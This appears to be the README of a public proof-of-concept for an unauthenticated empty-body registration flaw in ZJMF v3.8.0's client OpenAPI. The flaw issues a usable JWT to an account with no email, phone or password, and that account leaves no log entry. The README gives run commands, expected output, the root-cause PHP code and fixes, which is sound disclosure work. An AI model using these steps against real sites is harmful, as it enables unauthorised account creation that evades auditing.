# zjmf-v1-register-unauth-account-poc

ZJMF（智简魔方 / 魔方财务）v3.8.0 及以下客户区 OpenAPI `POST /v1/register` 空参数未授权注册漏洞的公开安全版 PoC。

一条空请求即可创建一个没有邮箱、没有手机号、没有密码的客户账号，并在响应中直接返回一个可被 `Check` 中间件接受的 JWT；该账号不会产生客户注册日志。

> **仅限授权安全测试使用。** 请勿对未授权的第三方系统使用；使用本工具造成的任何后果由使用者自行承担。
>
> 该漏洞于 2026 年 8 月初被发现。为降低对现有站点的影响，PoC 延迟至 2026 年 11 月公开。

***

## 说明

本Poc**只做单账号验证**：

- 默认不会创建任何账号：不带 `--i-have-permission` 时直接停止，不发送创建请求；

- `--check` 只执行 `GET /v1/register` 做只读检查；

- 创建账号必须显式传入 `--i-have-permission`；

- 不提供批量注册；

- 不提供工单创建；

- 不包含任何真实目标、Cookie、JWT、客户数据或生产日志。

单账号注册 + `GET /v1/user` 验证 JWT 已经足以证明漏洞存在。

***

## 受影响产品

| 项目     | 内容                                                         |
| ------ | ---------------------------------------------------------- |
| 产品     | ZJMF / 智简魔方 / 魔方财务                                         |
| 版本     | v3.8.0 及以下客户区 OpenAPI（在 v3.8.0 上验证；更早版本如使用相同注册逻辑，可能存在相同问题） |
| 接口     | `POST /v1/register`                                        |
| 是否需要登录 | 否                                                          |
| 影响     | 未授权创建账号、签发可用 JWT、审计缺失                                      |

相关接口：

- `GET  /v1/register`：查看站点开放的注册方式

- `GET  /v1/user`：验证注册返回的 JWT 是否被接受

- `POST /v1/register`：空 body 注册

***

## 环境要求

- Python 3.8+

- 无第三方依赖，仅使用标准库

***

## 使用方法

`--host` 默认值为空，必填。缺少协议时会自动补 `https://`，末尾 `/` 会自动去掉。

### 1. 只读检查（推荐第一步，不创建账号）

```bash
python3 poc.py --host https://your-zjmf-host --check
```

预期输出：

```text
[*] 目标: https://your-zjmf-host
[GET /v1/register] HTTP 200
  {"status":200,"msg":"SUCCESS MESSAGE","data":{"register_phone":{"captcha":1,"code":1},...}}
[*] 服务端声明的注册方式为仅手机注册；空 body 的 POST 仍可能绕过该限制。
[*] 检查模式：未创建任何账号。
```

### 2. 单账号验证（必须确认已获得授权）

```bash
python3 poc.py --host https://your-zjmf-host --i-have-permission
```

预期输出：

```text
[*] 目标: https://your-zjmf-host
[GET /v1/register] HTTP 200
  ...
[*] 服务端声明的注册方式为仅手机注册；空 body 的 POST 仍可能绕过该限制。

[*] 开始单账号验证（本脚本不会批量创建，也不会创建工单）。
[POST /v1/register（空 body）] HTTP 200
  {"jwt":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...<已打码>","status":200,"msg":"registration success"}
[+] 已获取 JWT，客户 id=36xx username=None
[GET /v1/user（注册返回的 JWT）] HTTP 200
  {"status":1001,"msg":"Token验证通过","id":"36xx","username":null,...}
[+] 结论：JWT 已通过 Check 中间件，匿名账号获得了 API 身份，漏洞存在。
[*] 清理：请在后台或数据库中删除本次创建的空邮箱/空手机号客户。
```

如果不加 `--i-have-permission`，脚本会打印停止提示并以退出码 1 结束，不会创建账号。

### 其他参数

```text
--timeout 10     HTTP 超时秒数（默认 10）
--insecure       跳过 TLS 证书校验（自签名测试实例）
--verbose        打印完整响应体（JWT 仍打码）
```

***

## PoC 验证了什么

1. `POST /v1/register` 发送空表单 body，返回 HTTP 200 和 `jwt`。
2. JWT 的 payload 中包含新分配的客户 id，`username` 为 `null`。
3. 用 `Authorization: JWT <token>` 请求 `GET /v1/user`，返回 `status: 1001`（`Token验证通过`）。
4. 说明注册返回的 JWT 不需要登录、不需要绑定邮箱/手机，直接通过 `Check` 中间件。
5. 该账号没有邮箱、没有手机号、没有密码，但仍拥有按 `uid` 划分的客户区 API 身份。
6. `ClientsModel::register()` 只在 `email` 或 `phonenumber` 非空时写 `active_log`，因此该账号不会留下注册日志。

***

## 根因（简要）

- `app/openapi/controller/LoginController.php::register()` 在进入注册模型前，没有强制要求至少一个身份字段。

- `app/home/model/ClientsModel.php::register()` 直接按请求字段插入客户记录，邮箱、手机号、密码为空也接受。

- `createJwt()` 把 JWT 写入 `client_user_login_token_<jwt>` 缓存；`app/http/middleware/Check.php::checkToken()` 只校验缓存、签名、IP 和密码修改时间，不校验账号是否完成了邮箱/手机/实名验证。

关键代码：

```php
// app/home/model/ClientsModel.php::register()
default:
    $result = 0; // 覆盖了 case 1 / case 2 的查重结果
    $user["password"] = password_decrypt($user["password"]);
    if (empty($result)) {
        $data = [
            "username"    => !empty($user["username"]) ? $user["username"] : ($user["phonenumber"] ?? substr($user["email"], 0, strpos($user["email"], "@"))),
            "email"       => $user["email"] ?? "",
            "phonenumber" => $user["phonenumber"] ?? "",
            "password"    => !empty($user["password"]) ? cmf_password($user["password"]) : "",
            // ...
        ];
        $userId = Db::name("clients")->insertGetId($data);
        if (!empty($user["phonenumber"])) { active_log_final(...); }
        if (!empty($user["email"]))       { active_log_final(...); }
        return json(["jwt" => createJwt($userinfo), "status" => 200, "msg" => "注册成功"]);
    }
```

```php
// app/common.php::createJwt()
$jwt = Firebase\JWT\JWT::encode($token, $key);
$key = "client_user_login_token_" . $jwt;
Cache::set($key, $userinfo["id"], $expire);
return $jwt;
```

***

## 影响

- 任意未登录访问者可以创建客户账号，绕过手机/邮箱验证、短信/邮箱验证码和图形验证码。

- 账号会获得可用 JWT，可调用所有走 `Check` 的客户区 OpenAPI（以 `uid` 为边界）。

- 账号没有邮箱/手机，按客户列表搜索很难发现，也不会产生注册日志，形成审计盲区。

本公开版不演示批量注册和工单创建，仅用于确认漏洞是否存在。

***

## 修复建议

1. **入口校验**：`/v1/register` 强制要求 `phone` 或 `email` 至少一个；手机注册必须校验短信验证码，邮箱注册必须校验邮箱验证码；按配置校验图形验证码；按 IP/账号限流。
2. **模型兜底**：`ClientsModel::register()` 在 `email` 和 `phonenumber` 同时为空时拒绝注册；OAuth 三方登录等确需空身份的路径用显式参数放行。
3. **JWT 签发**：不要给未验证身份的账号签发正常登录 JWT；可返回“待验证 token”，或在 JWT 中加入 `identity_verified` 字段并在 `Check` 中拦截未验证账号的写操作。
4. **日志完整性**：无论邮箱/手机是否为空都写注册日志，记录来源 IP、User-Agent 和注册方式。
5. **关联问题**：`secondVerify()` 改为参数化查询并加验证码尝试次数限制；`accountGetAccessTokenDirect()` 增加失败计数/验证码/频率限制；`get_client_ip6()` 不要直接信任 `X-Forwarded-For` 第一段。

***

## 清理测试数据

本 PoC 创建的账号 `email` 和 `phonenumber` 都为空。

建议通过后台删除，以便级联清理关联数据。

***

## 免责声明

本项目仅用于防御性研究和授权测试。作者不对任何滥用或损害负责。测试任何系统前请先获得书面授权，避免批量操作，并在测试结束后清理创建的账号。请勿将本工具用于未授权的访问、干扰或破坏。
